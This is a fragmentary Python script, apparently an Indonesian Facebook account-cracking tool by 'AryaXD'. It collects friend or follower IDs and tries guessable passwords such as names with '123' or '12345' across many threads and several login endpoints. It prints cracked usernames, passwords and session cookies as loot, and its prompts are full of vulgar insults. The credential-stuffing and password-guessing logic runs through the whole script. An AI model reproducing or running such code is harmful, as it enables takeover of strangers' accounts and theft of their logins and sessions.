...
def check_in(user, pasw,ttl):
	...
	if "c_user" in ses.cookies:
		cp-=1
		ok+=1
		print(f"\r{ijo}[SIESTA] TAP YES {user} | {pasw} | {''.join(ses.cookies.get_dict())}														{putih}",end="")
		...
		if(str(len(ngew))=="0"):
			...
			print(f"\r{ijo}[SIESTA] TAP YES {user} | {pasw} | {ttl}														{putih}",end="")
		else:
			print(f"\r{kuning}[SIESTA] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
		...
		try:
			for pw in aj:
				...
				if logika.get("status")=="ok":
					...
					print(f"\r\33[32;1m[SIESTA] {logika.get('user')} | {logika.get('pw')}\33[37;1m                                          \n",end="")
					break
					...
					if("".join(opsi)=="y"):
						...
						print(f"\r\33[1;33m[SIESTA] {user} | {logika.get('pw')} | {ttl}								\33[37;1m",end="")
					else:
						print(f"\r\33[1;33m[SIESTA] {user} | {logika.get('pw')} | {ttl}								\33[37;1m",end="")
					break
				print(f'\r[{biruL}={putih}] LO NGENTOD:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')
...
def dump(token,nama):
	global password
	os.system("clear")
	print(""" HMPHHH...BETSUNI """)
	print(f"KONTOL BAPAK KAU PECAH")
	print(f"Author AryaXD")
	print(f"Script Hemker Akun Efbeh")
	print(f"HALO {nama} LO NGENTOD")
	print(f"\nTOD?\n[01] CRACK LEWAT TEMAN\n[02] CRACK LEWAT FOLLOWERS\n[03] CARI TARGET CRACK\n[04] CEK HASIL MALING\n[UA] GANTI UA\n")
	l=input(f"[?] TOD : ")
	if(l in ("01","1")):
		print(f"\n[!] Ketik {biru}'me'{putih} Untuk Crack Dari Daftar Temanmu [!]")
		i=input(f"[+] ID TARGET\t: ")
		try:
		...
		dump(token,nama)
	time.sleep(1)
	print(f"[{biruM}/\{putih}] PILIH METODE LOGIN [{biruM}/\{putih}]\n[{biruL}01{putih}] LOGIN LEWAT {merah}B-API{putih} (FAST)\n[{biruL}02{putih}] LOGIN LEWAR {kuning}MBASIC V1{putih} (FAST)\n[{biruL}03{putih}] LOGIN LEWAT {ijo}MBASIC V2{putih} (SLOW) [RECOMMENDED]\n")
	pi=input(f"[{biru}?{putih}] TOD? : ")
	print("")
	print(f" *** Password Deffault : Nama Lengkap,Nama123,1234,12345")
	print(f" *** Ingin Memasukan Password Tambahan? Contoh : arya,sayang,siesta {biru}'t'{putih} Untuk Tidak\n")
	if(pi in ("01","1")):
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Password Tambahan\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Munculkan Opsi Sesi [y/t]\t: ")
			print("\n *** Lo Pedopil Bau Bawang, CTRL+Z Untuk Stop\n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
				opsi.append('t')
